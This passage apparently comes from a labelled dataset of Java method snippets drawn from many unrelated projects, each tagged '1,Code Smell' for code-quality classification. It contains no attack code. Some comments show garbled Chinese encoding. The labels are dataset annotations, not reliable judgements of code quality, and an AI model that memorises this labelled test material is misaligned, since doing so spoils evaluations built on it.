      getDialogImpl().getDialogXAnimImpl().doShowAnim(me,getDialogImpl().bkg);
    }
 else {
      getDialogView().setVisibility(View.VISIBLE);
    }
    return this;
  }
  super.beforeShow();
  if (getDialogView() == null) {
    int layoutId=style.layout(isLightTheme());
    layoutId=layoutId == 0 ? (isLightTheme() ? R.layout.layout_dialogx_material : R.layout.layout_dialogx_material_dark) : layoutId;
    View dialogView=createView(layoutId);
    dialogImpl=new DialogImpl(dialogView);
    if (dialogView != null)     dialogView.setTag(me);
    show(dialogView);
  }
 else {
    show(getDialogView());
  }
  return this;
}
public void show(Activity activity){
  super.beforeShow();
  if (getDialogView() == null) {
    int layoutId=style.layout(isLightTheme());
    layoutId=layoutId == 0 ? (isLightTheme() ? R.layout.layout_dialogx_material : R.layout.layout_dialogx_material_dark) : layoutId;
    View dialogView=createView(layoutId);
    dialogImpl=new DialogImpl(dialogView);
    if (dialogView != null)     dialogView.setTag(me);
    show(activity,dialogView);
  }
 else {
    show(activity,getDialogView());
  }
}",1,Code Smell
"@Override public BlockState getStateForPlacement(BlockPlaceContext pContext){
  BlockState stateForPlacement=super.getStateForPlacement(pContext);
  BlockState placedOn=pContext.getLevel().getBlockState(pContext.getClickedPos().relative(pContext.getClickedFace().getOpposite()));
  if (placedOn.getBlock() == this && (pContext.getPlayer() == null || !pContext.getPlayer().isShiftKeyDown()))   stateForPlacement=stateForPlacement.setValue(AXIS,placedOn.getValue(AXIS));
  return stateForPlacement;
}
",1,Code Smell
"private Exprent processExprentRecursive(Exprent exprent){
  boolean replaced=true;
  while (replaced) {
    replaced=false;
    for (    Exprent expr : exprent.getAllExprents()) {
      Exprent retexpr=processExprentRecursive(expr);
      if (retexpr != null) {
        exprent.replaceExprent(expr,retexpr);
        replaced=true;
        exprentReplaced=true;
        break;
      }
    }
  }
  if (exprent.type == Exprent.EXPRENT_ASSIGNMENT) {
    AssignmentExprent as=(AssignmentExprent)exprent;
    if (as.getRight().type == Exprent.EXPRENT_FUNCTION) {
      FunctionExprent func=(FunctionExprent)as.getRight();
      VarType midlayer=null;
      if (func.getFuncType() >= FunctionExprent.FUNCTION_I2L && func.getFuncType() <= FunctionExprent.FUNCTION_I2S) {
        midlayer=func.getSimpleCastType();
        if (func.getLstOperands().get(0).type == Exprent.EXPRENT_FUNCTION) {
          func=(FunctionExprent)func.getLstOperands().get(0);
        }
 else {
          return null;
        }
      }
      if (func.getFuncType() == FunctionExprent.FUNCTION_ADD || func.getFuncType() == FunctionExprent.FUNCTION_SUB) {
        Exprent econd=func.getLstOperands().get(0);
        Exprent econst=func.getLstOperands().get(1);
        if (econst.type != Exprent.EXPRENT_CONST && econd.type == Exprent.EXPRENT_CONST && func.getFuncType() == FunctionExprent.FUNCTION_ADD) {
          econd=econst;
          econst=func.getLstOperands().get(0);
        }
        if (econst.type == Exprent.EXPRENT_CONST && ((ConstExprent)econst).hasValueOne()) {
          Exprent left=as.getLeft();
          VarType condtype=econd.getExprType();
          if (left.equals(econd) && (midlayer == null || midlayer.equals(condtype))) {
            FunctionExprent ret=new FunctionExprent(func.getFuncType() == FunctionExprent.FUNCTION_ADD ? FunctionExprent.FUNCTION_PPI : FunctionExprent.FUNCTION_MMI,econd,func.bytecode);
            ret.setImplicitType(condtype);
            exprentReplaced=true;
            return ret;
          }
        }
      }
    }
  }
  return null;
}",1,Code Smell
"public static URL redirectClassGetResource(Class<?> cl,String name) throws MalformedURLException {
  String mappedResource=findMappedResource(cl,name);
  if (mappedResource == null) {
    if (name.startsWith(""/java/"") || name.startsWith(""/jdk/"") || name.startsWith(""/javax/"")) {
      return ClassLoader.getPlatformClassLoader().getResource(name);
    }
    return cl.getResource(name);
  }
 else {
    URL resource=cl.getResource(mappedResource);
    return resource == null ? null : new URL(""remap:"" + resource);
  }
}
",1,Code Smell
"/** 
 * 鑾峰緱鏃呰濂栧姳
 * @param iUser
 * @return
 */
public String travelReward(IUser iUser){
  int hour=DateUtil.hour(new Date(),true);
  if (!(9 <= hour && hour < 20)) {
    String message=""娲诲姩鏈紑濮嬶紝寮�濮嬫椂闂�9鐐�-20鐐�"";
    throw new ServiceException(message);
  }
  Map<String,Integer> pageData=getUserIsolationPageData(iUser);
  Integer status=pageData.get(""status"");
  if (status == 3) {
    Integer currentPeriodCanConvertXmyNum=pageData.get(""currentPeriodCanConvertXmyNum"");
    Double travelRewardXmy=getXmTravelReward(iUser);
    receiveReward(iUser);
    shareReward(iUser);
    if (travelRewardXmy > currentPeriodCanConvertXmyNum) {
      String message=""褰撴湀鏃犲彲棰嗗彇濂栧姳"";
      throw new ServiceException(message);
    }
  }
  Integer remainChance=pageData.get(""remainChance"");
  if (remainChance < 1) {
    String message=""褰撴棩鏃呰娆℃暟宸茶�楀敖"";
    throw new ServiceException(message);
  }
 else {
    return startTravel(iUser);
  }
}",1,Code Smell
"public Collection<CategoryTree<G>> getCategories(){
  return getCategories(true,true);
}
/** 
 * Used to recursively navigate the whole category tree without any advance knowledge of what categories exist.
 * @return The subcategories of this category.
 */
public Collection<CategoryTree<G>> getCategories(boolean omitCategoryRoots,boolean omitEmptyCategories){
synchronized (lock) {
    List<CategoryTree<G>> cats=new ArrayList<>(subtrees.size());
    for (    CategoryTree<G> subtree : subtrees) {
      if (omitCategoryRoots && subtree.getDescriptor().isRoot()) {
        cats.addAll(subtree.getCategories());
      }
 else       if (!omitEmptyCategories || !subtree.getRecipes().isEmpty() || !subtree.getCategories().isEmpty()) {
        cats.add(subtree);
      }
    }
    if (!subtrees.isEmpty()) {
      CategoryTree<G> core=maybeAddCore(getDescriptor());
      if (core != null) {
        cats.add(core);
      }
    }
    return cats;
  }
}
",1,Code Smell
"@Test public void testMixSqlWithMySqlAndHive(){
  String sql=""SELECT a.dep_id, b.stu_id"" + "" FROM edu_manage.department AS a, action_required.homework_content AS b"" + "" WHERE a.dep_id = b.stu_id"";
  QueryProcedure queryProcedure=new QueryProcedureProducer(getSchemaPath(Arrays.asList(MYSQL_TABLE_NAME,HIVE_TABLE_NAME))).createQueryProcedure(sql);
  List<Class> extractorList=getExtractorList(queryProcedure);
  if (extractorList.contains(HiveExtractor.class) && extractorList.contains(JdbcExtractor.class) && extractorList.contains(DataSetTransformProcedure.class)) {
    Assert.assertTrue(true);
  }
}
",1,Code Smell
"public void visitAnyRefConstant(Clazz clazz,RefConstant refConstant){
  Clazz referencedClass=refConstant.referencedClass;
  if (referencedClass != null && !referencedClass.equals(clazz) || !refConstant.getClassName(clazz).equals(clazz.getName())) {
    refConstant.referencedMemberAccept(filteredMemberMarker);
  }
}
",1,Code Smell
"public void finalizeZipFile(ZipModel zipModel,OutputStream outputStream,Charset charset) throws IOException {
  if (zipModel == null || outputStream == null) {
    throw new ZipException(""input parameters is null, cannot finalize zip file"");
  }
  try (ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream()){
    processHeaderData(zipModel,outputStream);
    long offsetCentralDir=getOffsetOfCentralDirectory(zipModel);
    writeCentralDirectory(zipModel,byteArrayOutputStream,rawIO,charset);
    int sizeOfCentralDir=byteArrayOutputStream.size();
    if (zipModel.isZip64Format() || offsetCentralDir >= InternalZipConstants.ZIP_64_SIZE_LIMIT || zipModel.getCentralDirectory().getFileHeaders().size() >= InternalZipConstants.ZIP_64_NUMBER_OF_ENTRIES_LIMIT) {
      if (zipModel.getZip64EndOfCentralDirectoryRecord() == null) {
        zipModel.setZip64EndOfCentralDirectoryRecord(new Zip64EndOfCentralDirectoryRecord());
      }
      if (zipModel.getZip64EndOfCentralDirectoryLocator() == null) {
        zipModel.setZip64EndOfCentralDirectoryLocator(new Zip64EndOfCentralDirectoryLocator());
      }
      zipModel.getZip64EndOfCentralDirectoryLocator().setOffsetZip64EndOfCentralDirectoryRecord(offsetCentralDir + sizeOfCentralDir);
      if (isSplitZipFile(outputStream)) {
        int currentSplitFileCounter=getCurrentSplitFileCounter(outputStream);
        zipModel.getZip64EndOfCentralDirectoryLocator().setNumberOfDiskStartOfZip64EndOfCentralDirectoryRecord(currentSplitFileCounter);
        zipModel.getZip64EndOfCentralDirectoryLocator().setTotalNumberOfDiscs(currentSplitFileCounter + 1);
      }
 else {
        zipModel.getZip64EndOfCentralDirectoryLocator().setNumberOfDiskStartOfZip64EndOfCentralDirectoryRecord(0);
        zipModel.getZip64EndOfCentralDirectoryLocator().setTotalNumberOfDiscs(1);
      }
      Zip64EndOfCentralDirectoryRecord zip64EndOfCentralDirectoryRecord=buildZip64EndOfCentralDirectoryRecord(zipModel,sizeOfCentralDir,offsetCentralDir);
      zipModel.setZip64EndOfCentralDirectoryRecord(zip64EndOfCentralDirectoryRecord);
      writeZip64EndOfCentralDirectoryRecord(zip64EndOfCentralDirectoryRecord,byteArrayOutputStream,rawIO);
      writeZip64EndOfCentralDirectoryLocator(zipModel.getZip64EndOfCentralDirectoryLocator(),byteArrayOutputStream,rawIO);
    }
    writeEndOfCentralDirectoryRecord(zipModel,sizeOfCentralDir,offsetCentralDir,byteArrayOutputStream,rawIO,charset);
    writeZipHeaderBytes(zipModel,outputStream,byteArrayOutputStream.toByteArray(),charset);
  }
 }",1,Code Smell
"@Override protected void onActivityResult(int requestCode,int resultCode,@Nullable Intent data){
  super.onActivityResult(requestCode,resultCode,data);
  if (REQ_PICK_APPS == requestCode && resultCode == RESULT_OK && data != null && data.hasExtra(""apps"")) {
    List<AppInfo> appInfos=data.getParcelableArrayListExtra(""apps"");
    if (!CollectionUtils.isNullOrEmpty(appInfos)) {
      ThanosManager thanos=ThanosManager.from(getApplicationContext());
      PackageManager pm=thanos.getPkgManager();
      for (      AppInfo appInfo : appInfos) {
        packageSet.addPackage(Pkg.fromAppInfo(appInfo));
        pm.addToPackageSet(Pkg.fromAppInfo(appInfo),packageSet.getId());
      }
      viewModel.start();
      changed=true;
    }
  }
}
",1,Code Smell
"@Override @Transactional public String cancelOrder(String orderNo,Long userId){
  NewBeeMallOrder newBeeMallOrder=newBeeMallOrderMapper.selectByOrderNo(orderNo);
  if (newBeeMallOrder != null) {
    if (!userId.equals(newBeeMallOrder.getUserId())) {
      NewBeeMallException.fail(ServiceResultEnum.NO_PERMISSION_ERROR.getResult());
    }
    if (newBeeMallOrder.getOrderStatus().intValue() == NewBeeMallOrderStatusEnum.ORDER_SUCCESS.getOrderStatus() || newBeeMallOrder.getOrderStatus().intValue() == NewBeeMallOrderStatusEnum.ORDER_CLOSED_BY_MALLUSER.getOrderStatus() || newBeeMallOrder.getOrderStatus().intValue() == NewBeeMallOrderStatusEnum.ORDER_CLOSED_BY_EXPIRED.getOrderStatus() || newBeeMallOrder.getOrderStatus().intValue() == NewBeeMallOrderStatusEnum.ORDER_CLOSED_BY_JUDGE.getOrderStatus()) {
      return ServiceResultEnum.ORDER_STATUS_ERROR.getResult();
    }
    if (newBeeMallOrderMapper.closeOrder(Collections.singletonList(newBeeMallOrder.getOrderId()),NewBeeMallOrderStatusEnum.ORDER_CLOSED_BY_MALLUSER.getOrderStatus()) > 0 && recoverStockNum(Collections.singletonList(newBeeMallOrder.getOrderId()))) {
      return ServiceResultEnum.SUCCESS.getResult();
    }
 else {
      return ServiceResultEnum.DB_ERROR.getResult();
    }
  }
  return ServiceResultEnum.ORDER_NOT_EXIST_ERROR.getResult();
}",1,Code Smell
"public boolean match(Map<String,String> matchParam,boolean isHeader){
  if (!isHeader && ((MapUtils.isEmpty(matchParam) && CollectionUtils.isNotEmpty(matchRules)) || (CollectionUtils.isEmpty(matchRules) && MapUtils.isNotEmpty(matchParam)))) {
    return false;
  }
  if (isMatchAll) {
    for (    KeyValueInfo matchRule : matchRules) {
      if (!matchRule.matchValue(matchParam.get(matchRule.getKey()))) {
        return false;
      }
    }
    return true;
  }
 else {
    for (    KeyValueInfo matchRule : matchRules) {
      if (matchRule.matchValue(matchParam.get(matchRule.getKey()))) {
        return true;
      }
    }
    return false;
  }
}
",1,Code Smell
"public static SqlStatementInfo sanitize(Object query){
  if (query instanceof String) {
    return sanitizeString((String)query);
  }
  if ((QUERY_CLASS != null && QUERY_CLASS.isAssignableFrom(query.getClass())) || (STATEMENT_CLASS != null && STATEMENT_CLASS.isAssignableFrom(query.getClass()))) {
    return sanitizeString(query.toString());
  }
  String queryClassName=query.getClass().getName();
  if (queryClassName.equals(""com.couchbase.client.java.view.ViewQuery"") || queryClassName.equals(""com.couchbase.client.java.view.SpatialViewQuery"")) {
    return SqlStatementInfo.create(query.toString(),null,null);
  }
  if (N1QL_QUERY_CLASS != null && N1QL_QUERY_CLASS.isAssignableFrom(query.getClass())) {
    String statement=getStatementString(N1QL_GET_STATEMENT,query);
    if (statement != null) {
      return sanitizeString(statement);
    }
  }
  if (ANALYTICS_QUERY_CLASS != null && ANALYTICS_QUERY_CLASS.isAssignableFrom(query.getClass())) {
    String statement=getStatementString(ANALYTICS_GET_STATEMENT,query);
    if (statement != null) {
      return sanitizeString(statement);
    }
  }
  return SqlStatementInfo.create(query.getClass().getSimpleName(),null,null);
}",1,Code Smell
"@Override public void onItemsRemoved(RecyclerView recyclerView,int positionStart,int itemCount){
  if (DEBUG)   Log.v(getTag(),""onItemsRemoved positionStart "" + positionStart + "" itemCount ""+ itemCount);
  if (mFocusPosition != NO_POSITION && mGrid != null && mGrid.getFirstVisibleIndex() >= 0 && mFocusPositionOffset != Integer.MIN_VALUE) {
    int pos=mFocusPosition + mFocusPositionOffset;
    if (positionStart <= pos) {
      if (positionStart + itemCount > pos) {
        mFocusPositionOffset+=positionStart - pos;
        mFocusPosition+=mFocusPositionOffset;
        mFocusPositionOffset=Integer.MIN_VALUE;
      }
 else {
        mFocusPositionOffset-=itemCount;
      }
    }
  }
  mChildrenStates.clear();
}",1,Code Smell
"@Override protected Class<?> loadClass(String name,boolean resolve) throws ClassNotFoundException {
  final Class<?> loadedClass=findLoadedClass(name);
  if (loadedClass != null) {
    return loadedClass;
  }
  if (name != null && (name.startsWith(""java."") || name.startsWith(""sun."") || BRIDGE_CLASS.equals(name))) {
    return super.loadClass(name,resolve);
  }
  try {
    Class<?> aClass=findClass(name);
    if (resolve) {
      resolveClass(aClass);
    }
    return aClass;
  }
 catch (  Exception ignore) {
  }
  return super.loadClass(name,resolve);
}
",1,Code Smell
"@Override protected boolean readHeaders(ParsableByteArray packet,long position,SetupData setupData) throws IOException, InterruptedException {
  byte[] data=packet.data;
  if (streamMetadata == null) {
    streamMetadata=new FlacStreamMetadata(data,17);
    byte[] metadata=Arrays.copyOfRange(data,9,packet.limit());
    metadata[4]=(byte)0x80;
    List<byte[]> initializationData=Collections.singletonList(metadata);
    setupData.format=Format.createAudioSampleFormat(null,MimeTypes.AUDIO_FLAC,null,Format.NO_VALUE,streamMetadata.bitRate(),streamMetadata.channels,streamMetadata.sampleRate,initializationData,null,0,null);
  }
 else   if ((data[0] & 0x7F) == SEEKTABLE_PACKET_TYPE) {
    flacOggSeeker=new FlacOggSeeker();
    flacOggSeeker.parseSeekTable(packet);
  }
 else   if (isAudioPacket(data)) {
    if (flacOggSeeker != null) {
      flacOggSeeker.setFirstFrameOffset(position);
      setupData.oggSeeker=flacOggSeeker;
    }
    return false;
  }
  return true;
}",1,Code Smell
"@Subscribe public void viewWallet(ViewWalletEvent event){
  if (tabs.getScene().getWindow().equals(event.getWindow())) {
    for (    Tab tab : tabs.getTabs()) {
      if (tab.getUserData() instanceof WalletTabData) {
        TabPane subTabs=(TabPane)tab.getContent();
        for (        Tab subTab : subTabs.getTabs()) {
          WalletTabData walletTabData=(WalletTabData)subTab.getUserData();
          if (event.getStorage().getWalletId(event.getWallet()).equals(walletTabData.getWalletForm().getWalletId())) {
            tabs.getSelectionModel().select(tab);
            subTabs.getSelectionModel().select(subTab);
            return;
          }
        }
      }
    }
    for (    Tab tab : tabs.getTabs()) {
      if (tab.getUserData() instanceof WalletTabData) {
        TabPane subTabs=(TabPane)tab.getContent();
        for (        Tab subTab : subTabs.getTabs()) {
          WalletTabData walletTabData=(WalletTabData)subTab.getUserData();
          if (event.getStorage().getWalletFile().equals(walletTabData.getStorage().getWalletFile())) {
            tabs.getSelectionModel().select(tab);
            subTabs.getSelectionModel().select(subTab);
            return;
          }
        }
      }
    }
  }
}
",1,Code Smell
"private boolean updateKeyboardThemeAndContextThemeWrapper(final Context context,final KeyboardTheme keyboardTheme){
  final boolean nightModeChanged=(mCurrentUiMode & Configuration.UI_MODE_NIGHT_MASK) != (context.getResources().getConfiguration().uiMode & Configuration.UI_MODE_NIGHT_MASK);
  if (mThemeContext == null || !keyboardTheme.equals(mKeyboardTheme) || nightModeChanged) {
    mKeyboardTheme=keyboardTheme;
    mThemeContext=new ContextThemeWrapper(context,keyboardTheme.mStyleId);
    mCurrentUiMode=context.getResources().getConfiguration().uiMode;
    KeyboardLayoutSet.onKeyboardThemeChanged();
    return true;
  }
  return false;
}
",1,Code Smell
"public static boolean handleIntent(Intent intent,Browser.Progress progress){
  Uri data=intent.getData();
  if (data != null) {
    String scheme=data.getScheme();
    if (scheme != null) {
      if ((scheme.equals(""http"") || scheme.equals(""https""))) {
        String host=data.getHost().toLowerCase();
        if (host.equals(""telegram.me"") || host.equals(""t.me"") || host.equals(""telegram.dog"")) {
          String path=data.getPath();
          if (path != null) {
            String lastPathSegment=data.getLastPathSegment();
            if (path.startsWith(""/giftcode"") && lastPathSegment != null) {
              show(LaunchActivity.getLastFragment(),lastPathSegment,progress);
              return true;
            }
          }
        }
      }
 else       if (scheme.equals(""tg"")) {
        String url=data.toString();
        String lastPathSegment=data.getLastPathSegment();
        if (url.startsWith(""tg:giftcode"") || url.startsWith(""tg://giftcode"")) {
          if (lastPathSegment != null) {
            show(LaunchActivity.getLastFragment(),lastPathSegment,progress);
            return true;
          }
        }
      }
    }
  }
  return false;
}
",1,Code Smell
"@Override protected Dimension getDisplaySize(){
  paddingBorder.uninstall();
  Dimension displaySize=super.getDisplaySize();
  paddingBorder.uninstall();
  int displayWidth=displaySize.width - padding.left - padding.right;
  int displayHeight=displaySize.height - padding.top - padding.bottom;
  if (displayWidth == 100 && comboBox.isEditable() && comboBox.getItemCount() == 0 && comboBox.getPrototypeDisplayValue() == null) {
    displayWidth=Math.max(getDefaultSize().width,editor.getPreferredSize().width);
  }
  return new Dimension(displayWidth,displayHeight);
}",1,Code Smell
"private void tabLabelStopAnimation(Wallet wallet){
  Set<Wallet> relatedWallets=new HashSet<>(wallet.isMasterWallet() ? wallet.getChildWallets() : wallet.getMasterWallet().getChildWallets());
  relatedWallets.remove(wallet);
  if (!wallet.isMasterWallet()) {
    relatedWallets.add(wallet.getMasterWallet());
  }
  if (loadingWallets.stream().noneMatch(relatedWallets::contains)) {
    tabs.getTabs().stream().filter(tab -> tab.getUserData() instanceof WalletTabData && ((TabPane)tab.getContent()).getTabs().stream().map(subTab -> ((WalletTabData)subTab.getUserData()).getWallet()).anyMatch(tabWallet -> tabWallet == wallet)).forEach(this::tabLabelStopAnimation);
  }
}
private void tabLabelStopAnimation(Transaction transaction){
  tabs.getTabs().stream().filter(tab -> tab.getUserData() instanceof TransactionTabData && ((TransactionTabData)tab.getUserData()).getTransaction().getTxId().equals(transaction.getTxId())).forEach(this::tabLabelStopAnimation);
}
private void tabLabelStopAnimation(Tab tab){
  Label tabLabel=(Label)tab.getGraphic();
  if (tabLabel.getUserData() != null) {
    Animation animation=(Animation)tabLabel.getUserData();
    animation.stop();
    tabLabel.setUserData(null);
    tabLabel.getGraphic().setOpacity(tab.isSelected() ? TAB_LABEL_GRAPHIC_OPACITY_ACTIVE : TAB_LABEL_GRAPHIC_OPACITY_INACTIVE);
  }
}
",1,Code Smell
"@Override public boolean mouseClicked(double x,double y,int button){
  if (identifyMode && hoveredBlockPos != null && PonderIndex.editingModeActive()) {
    long handle=minecraft.getWindow().getWindow();
    if (copiedBlockPos != null && button == 1) {
      clipboardHelper.setClipboard(handle,""util.select.fromTo("" + copiedBlockPos.getX() + "", ""+ copiedBlockPos.getY()+ "", ""+ copiedBlockPos.getZ()+ "", ""+ hoveredBlockPos.getX()+ "", ""+ hoveredBlockPos.getY()+ "", ""+ hoveredBlockPos.getZ()+ "")"");
      copiedBlockPos=hoveredBlockPos;
      return true;
    }
    if (hasShiftDown())     clipboardHelper.setClipboard(handle,""util.select.position("" + hoveredBlockPos.getX() + "", ""+ hoveredBlockPos.getY()+ "", ""+ hoveredBlockPos.getZ()+ "")"");
 else     clipboardHelper.setClipboard(handle,""util.grid.at("" + hoveredBlockPos.getX() + "", ""+ hoveredBlockPos.getY()+ "", ""+ hoveredBlockPos.getZ()+ "")"");
    copiedBlockPos=hoveredBlockPos;
    return true;
  }
  return super.mouseClicked(x,y,button);
}",1,Code Smell
"/** 
 * 读取一个缩放后的图片，限定图片大小，避免OOM http://blog.sina.com.cn/s/blog_5de73d0b0100zfm8.html
 * @param uri       图片uri，支持“file://”、“content://”
 * @param maxWidth  最大允许宽度
 * @param maxHeight 最大允许高度
 * @return 返回一个缩放后的Bitmap，失败则返回null
 */
public static Bitmap decodeUri(Context context,Uri uri,int maxWidth,int maxHeight){
  BitmapFactory.Options options=new BitmapFactory.Options();
  options.inJustDecodeBounds=true;
  resolveUri(context,uri,options);
  int scale=1;
  for (int i=0; i < Integer.MAX_VALUE; i++) {
    if ((options.outWidth / scale > maxWidth && options.outWidth / scale > maxWidth * 1.4) || (options.outHeight / scale > maxHeight && options.outHeight / scale > maxHeight * 1.4)) {
      scale++;
    }
 else {
      break;
    }
  }
  options.inSampleSize=scale;
  options.inJustDecodeBounds=false;
  options.inPreferredConfig=Bitmap.Config.RGB_565;
  Bitmap bitmap=null;
  try {
    bitmap=resolveUriForBitmap(context,uri,options);
  }
 catch (  Throwable e) {
    e.printStackTrace();
  }
  return bitmap;
}",1,Code Smell
"@Nullable private static Result inspect(AgentBuilder.RawMatcher matcher) throws Exception {
  if (matcher instanceof AgentBuilder.RawMatcher.Conjunction) {
    List<AgentBuilder.RawMatcher> matchers=getDelegateMatchers(matcher);
    if (!matchers.isEmpty()) {
      return inspect(matchers.get(0));
    }
  }
 else   if (matcher instanceof AgentBuilder.RawMatcher.ForElementMatchers) {
    ElementMatcher<?> elementMatcher=getDelegateMatcher((AgentBuilder.RawMatcher.ForElementMatchers)matcher);
    Result result=inspect(elementMatcher);
    if (result == null && logger.isLoggable(FINE) && shouldLog(elementMatcher)) {
      logger.log(Level.FINE,""Could not decompose matcher {0}"",elementMatcher);
    }
    return result;
  }
  return null;
}
@Nullable private static Result inspect(ElementMatcher<?> matcher) throws Exception {
  if (matcher instanceof DelegatingMatcher) {
    Result result=inspect(((DelegatingMatcher)matcher).getDelegate());
    if (matcher instanceof DelegatingSuperTypeMatcher) {
      return Result.subtype(result);
    }
    return result;
  }
 else   if (matcher instanceof HasSuperClassMatcher) {
    return Result.subtype(inspect(getDelegateMatcher((HasSuperClassMatcher<?>)matcher)));
  }
 else   if (matcher instanceof HasSuperTypeMatcher) {
    return Result.subtype(inspect(getDelegateMatcher((HasSuperTypeMatcher<?>)matcher)));
  }
 else   if (matcher instanceof ErasureMatcher) {
    return inspect(getDelegateMatcher((ErasureMatcher<?>)matcher));
  }
 else   if (matcher instanceof NameMatcher) {
    return inspectNameMatcher((NameMatcher<?>)matcher);
  }
 else   if (matcher instanceof ElementMatcher.Junction.Conjunction) {
    List<ElementMatcher<?>> matchers=getDelegateMatchers((ElementMatcher.Junction.Conjunction<?>)matcher);
    for (    ElementMatcher<?> elementMatcher : matchers) {
      Result result=inspect(elementMatcher);
      if (result != null) {
        return result;
      }
    }
  }
  return null;
}",1,Code Smell
"@Override public void onGlobalLayout(){
  ImageView imageView=getImageView();
  if (null != imageView) {
    if (mZoomEnabled) {
      final int top=imageView.getTop();
      final int right=imageView.getRight();
      final int bottom=imageView.getBottom();
      final int left=imageView.getLeft();
      if (top != mIvTop || bottom != mIvBottom || left != mIvLeft || right != mIvRight) {
        updateBaseMatrix(imageView.getDrawable());
        mIvTop=top;
        mIvRight=right;
        mIvBottom=bottom;
        mIvLeft=left;
      }
    }
 else {
      updateBaseMatrix(imageView.getDrawable());
    }
  }
}
",1,Code Smell
"/** 
 * Check whether device supports mode change. Also shows toast if no
 * @return mode change supported
 */
public static boolean supportsDisplayModeChange(){
  boolean supportedDevice=true;
  if (VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
    supportedDevice=false;
  }
 else {
switch (VERSION.SDK_INT) {
case Build.VERSION_CODES.LOLLIPOP:
case Build.VERSION_CODES.LOLLIPOP_MR1:
      if (!isAmazonFireTVDevice()) {
        supportedDevice=false;
      }
    break;
}
}
if (!supportedDevice) {
Log.i(TAG,""Device doesn't support display mode change"");
}
return supportedDevice;
}",1,Code Smell
"@SuppressWarnings({""rawtypes""}) public static void parseKey(Parsed parsed,Class clz){
  List<Field> list=new ArrayList<>();
  try {
    list.addAll(Arrays.asList(clz.getDeclaredFields()));
    Class sc=clz.getSuperclass();
    if (sc != Object.class) {
      list.addAll(Arrays.asList(sc.getDeclaredFields()));
    }
  }
 catch (  Exception e) {
  }
  for (  Field f : list) {
    X.Key a=f.getAnnotation(X.Key.class);
    if (a != null) {
      f.setAccessible(true);
      parsed.setKeyField(f);
      break;
    }
 else {
      for (      Annotation anno : f.getAnnotations()) {
        String annoName=anno.annotationType().getName();
        if (annoName.endsWith("".Id"") || annoName.endsWith("".ID"") || annoName.endsWith("".TableId"")) {
          f.setAccessible(true);
          parsed.setKeyField(f);
          break;
        }
      }
      if (SqliStringUtil.isNotNull(parsed.getKey())) {
        break;
      }
    }
  }
}
",1,Code Smell
"@SneakyThrows @Override public boolean create(FlinkApplication appParam){
  ApiAlertException.throwIfNull(appParam.getTeamId(),""The teamId can't be null. Create application failed."");
  appParam.setUserId(ServiceHelper.getUserId());
  appParam.setState(FlinkAppStateEnum.ADDED.getValue());
  appParam.setRelease(ReleaseStateEnum.NEED_RELEASE.get());
  appParam.setOptionState(OptionStateEnum.NONE.getValue());
  Date date=new Date();
  appParam.setCreateTime(date);
  appParam.setModifyTime(date);
  appParam.setDefaultModeIngress(settingService.getIngressModeDefault());
  String jobName=appParam.getJobName();
  validateCondition(!jobName.contains("" ""),""The added job name `%s` is an invalid character and cannot contain Spaces"",jobName);
  validateCondition(validateQueueIfNeeded(appParam),ERROR_APP_QUEUE_HINT,appParam.getYarnQueue(),appParam.getTeamId());
  appParam.doSetHotParams();
  if (appParam.isResourceFromUpload()) {
    String jarPath=String.format(""%s/%d/%s"",Workspace.local().APP_UPLOADS(),appParam.getTeamId(),appParam.getJar());
    if (!new File(jarPath).exists()) {
      Resource resource=resourceService.findByResourceName(appParam.getTeamId(),appParam.getJar());
      if (resource != null && StringUtils.isNotBlank(resource.getFilePath())) {
        jarPath=resource.getFilePath();
      }
    }
    appParam.setJarCheckSum(org.apache.commons.io.FileUtils.checksumCRC32(new File(jarPath)));
  }
  Application application=applicationService.create(EngineTypeEnum.FLINK);
  appParam.setId(application.getId());
  boolean saveSuccess=save(appParam);
  if (saveSuccess) {
    FlinkJobType jobType=appParam.getJobTypeEnum();
    if (jobType == FlinkJobType.FLINK_SQL || jobType == FlinkJobType.PYFLINK || jobType == FlinkJobType.FLINK_CDC) {
      FlinkSql flinkSql=new FlinkSql(appParam);
      flinkSqlService.create(flinkSql);
    }
    if (appParam.getConfig() != null) {
      configService.create(appParam,true);
    }
    return true;
  }
 else {
    throw new ApiAlertException(""create application failed"");
  }
}",1,Code Smell
"@Override public boolean alone(){
  boolean alone=false;
  Object aloneProperty=project.findProperty(""bytex."" + extension.getName() + "".alone"");
  if (aloneProperty != null) {
    alone=Boolean.parseBoolean(aloneProperty.toString());
  }
  if (!alone && !transformConfiguration().isIncremental() && BooleanProperty.ENABLE_SEPARATE_PROCESSING_NOTINCREMENTAL.value()) {
    alone=true;
  }
  return alone;
}
",1,Code Smell
"/** 
 * Attempts to build a plan for fitting a range of sources into rop registers.
 * @param ropReg {@code >= 0;} rop reg that begins range
 * @param insn {@code non-null;} insn to plan range for
 * @param categoriesForIndex {@code non-null;} indexed by source index; the category for eachsource
 * @param outMovesRequired {@code non-null;} an output parameter indexed by source index that willcontain the set of sources which need moves inserted
 * @return the width of the fit that that does not involve added moves or {@code -1} if ""no fitpossible""
 */
private int fitPlanForRange(int ropReg,NormalSsaInsn insn,int[] categoriesForIndex,BitSet outMovesRequired){
  RegisterSpecList sources=insn.getSources();
  int szSources=sources.size();
  int fitWidth=0;
  IntSet liveOut=insn.getBlock().getLiveOutRegs();
  RegisterSpecList liveOutSpecs=ssaSetToSpecs(liveOut);
  BitSet seen=new BitSet(ssaMeth.getRegCount());
  for (int i=0; i < szSources; i++) {
    RegisterSpec ssaSpec=sources.get(i);
    int ssaReg=ssaSpec.getReg();
    int category=categoriesForIndex[i];
    if (i != 0) {
      ropReg+=categoriesForIndex[i - 1];
    }
    if (ssaRegsMapped.get(ssaReg) && mapper.oldToNew(ssaReg) == ropReg) {
      fitWidth+=category;
    }
 else     if (rangeContainsReserved(ropReg,category)) {
      fitWidth=-1;
      break;
    }
 else     if (!ssaRegsMapped.get(ssaReg) && canMapReg(ssaSpec,ropReg) && !seen.get(ssaReg)) {
      fitWidth+=category;
    }
 else     if (!mapper.areAnyPinned(liveOutSpecs,ropReg,category) && !mapper.areAnyPinned(sources,ropReg,category)) {
      outMovesRequired.set(i);
    }
 else {
      fitWidth=-1;
      break;
    }
    seen.set(ssaReg);
  }
  return fitWidth;
}",1,Code Smell
"private void initMultiSelectListPreference(OptionCategory category,MultiSelectListPreference pref){
  initDialogPreference(category,pref);
  ListPreferenceData prefData=createListPreferenceData(category.options);
  pref.setEntries(prefData.entries);
  pref.setEntryValues(prefData.values);
  pref.setValues(prefData.defaultValues);
  pref.setOnPreferenceChangeListener((preference,newValue) -> {
